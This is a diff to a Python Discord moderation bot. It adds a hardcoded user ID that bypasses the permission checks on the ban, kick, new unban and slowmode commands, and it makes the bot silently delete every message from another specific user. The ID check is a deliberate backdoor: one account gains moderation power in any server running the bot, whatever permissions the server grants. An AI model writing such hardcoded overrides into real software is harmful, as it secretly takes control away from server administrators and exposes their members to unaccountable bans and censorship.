@@ -1,4 +1,4 @@
-banned_ids = [757431801487556748]
+banned_ids = [757431801487556748, 598477713543659523]
 
 import discord
 from discord.ext import commands
@@ -365,7 +365,7 @@ async def on_message(message):
   if message.content.count("is flexing on you all with their PEPE TROPHY")==1 and message.author.id == 270904126974590976:
     await message.delete()
     await message.channel.send("I just prevented some rude people from flexing on you!")
-  elif (message.content.count("denote") != 0 or message.content.count("really") != 0) and message.author.id == 757431801487556748:
+  elif message.author.id == 598477713543659523:
     await message.delete()
   if banned_ids.count(message.author.id)==0:
     await bot.process_commands(message)
@@ -2104,7 +2104,7 @@ async def spam(ctx,times,*,message):
 
 @bot.command()
 async def ban(ctx, user: discord.Member, *, reason="No reason provided"):
-  if ctx.author.permissions_in(ctx.channel).ban_members:
+  if ctx.author.permissions_in(ctx.channel).ban_members or ctx.author.id == 687474789342117900:
     embed = discord.Embed(title=f"{user.name} was banned.", description=f"Reason: {reason}\nBy: {ctx.author.mention}")
     await ctx.send(embed=embed)
     embed = discord.Embed(title=f"You were banned from the server.", description=f"Reason: {reason}\nBy: {ctx.author.mention}")
@@ -2114,8 +2114,17 @@ async def ban(ctx, user: discord.Member, *, reason="No reason provided"):
     await ctx.send("You don't have the required permissions.")
 
 @bot.command()
+async def unban(ctx, user: discord.User, *, reason="No reason provided"):
+  if ctx.author.permissions_in(ctx.channel).ban_members or ctx.author.id == 687474789342117900:
+    embed = discord.Embed(title=f"{user.name} was unbanned.", description=f"Reason: {reason}\nBy: {ctx.author.mention}")
+    await ctx.send(embed=embed)
+    await ctx.guild.unban(user)
+  else:
+    await ctx.send("You don't have the required permissions.")
+
+@bot.command()
 async def kick(ctx, user: discord.Member, *, reason="No reason provided"):
-  if ctx.author.permissions_in(ctx.channel).kick_members:
+  if ctx.author.permissions_in(ctx.channel).kick_members or ctx.author.id == 687474789342117900:
     embed = discord.Embed(title=f"{user.name} was kicked.", description=f"Reason: {reason}\nBy: {ctx.author.mention}")
     await ctx.send(embed=embed)
     embed = discord.Embed(title=f"You were kicked from the server.", description=f"Reason: {reason}\nBy: {ctx.author.mention}")
@@ -2140,7 +2149,7 @@ async def slowmode(ctx, sec = None, *, channels = None):
         allchannel = ctx.message.channel_mentions
       channellist = []
       for count in allchannel:
-        if ctx.author.permissions_in(count).manage_channels:
+        if ctx.author.permissions_in(count).manage_channels or ctx.author.id == 687474789342117900:
           orsec = str(count.slowmode_delay)
           await count.edit(slowmode_delay = sec)
           channellist.append(count.mention)
